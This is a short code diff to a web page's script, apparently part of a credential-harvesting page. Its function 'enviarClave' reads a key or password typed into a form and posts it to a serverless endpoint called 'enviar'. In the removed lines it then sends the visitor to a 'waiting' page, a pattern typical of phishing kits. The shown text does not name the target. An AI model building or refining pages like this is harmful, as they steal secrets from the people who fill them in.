@@ -32,23 +32,19 @@
 
 <script>
 function enviarClave() {
-    const clave = document.getElementById("claveInput").value;
-    if (!clave) return;
+  const clave = document.getElementById("claveInput").value;
 
-    fetch("/.netlify/functions/enviar", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-            tipo: "clave",
-            valor: clave
-        })
-    });
-
-    setTimeout(() => {
-        window.location.href = "espera.html";
-    }, 300);
+  fetch("/.netlify/functions/enviar", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      tipo: "clave",
+      valor: clave
+    })
+  });
 }
 </script>
+
 
 
 
